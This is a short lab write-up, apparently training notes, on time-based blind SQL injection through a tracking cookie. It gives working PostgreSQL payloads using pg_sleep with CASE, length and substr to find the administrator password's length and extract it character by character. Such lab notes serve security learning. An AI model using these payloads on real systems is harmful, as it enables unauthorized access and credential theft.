# Lab: Blind SQL injection with time delays and information retrieval

Vulnerable Parameter :  Tracking Cookie

End Goals :

- Exploit time-based sqli
- Extract admin credentials
- Login as admin

Analysis :

select somestuff from trackingTable where trackingId = 'value';

1- Confirm that the parameter is vulnerable to sqli

value = ' ||  '(select pg_sleep(10) ) ' -- -> didn't work , because we was concatinating the command as a string and didn't got executed as a sql command

`'+||++pg_sleep(10)+--` -> this payload got actually executed as a sql command

2-determin the length of the password

`'+||++(pg_sleep(10))+--` -> To extract infos from the database i think the only way to do it is to brute force the data and then compare it , in case we are right
then -> sleep (n) , else -> don't sleep

select++case+when+(length(password)%3d'1')+then+pg_sleep(1)++else+'' +end+from+users+where+username%3d'administrator'+

`'+||++(select++case+when+(length(password)%3d'20')+then+pg_sleep(10)++else+'' +end+from+users+where+username%3d'administrator'+)+--` -> Sleeped for 10 seconds -> the length of the password for the administrator is = 20

3- Extract admin password

+union+select++case+when+(substr(password,1,1)%3d'2')+then+pg_sleep(5)+else+''+end+from+users+where+username%3d'administrator'+-- -> base payload

substr("string" , start_position , size)

payload :

' || (select case when (substr(password,1,1)='2') then pg_sleep(5) else '' end from users where username='administrator' ) --
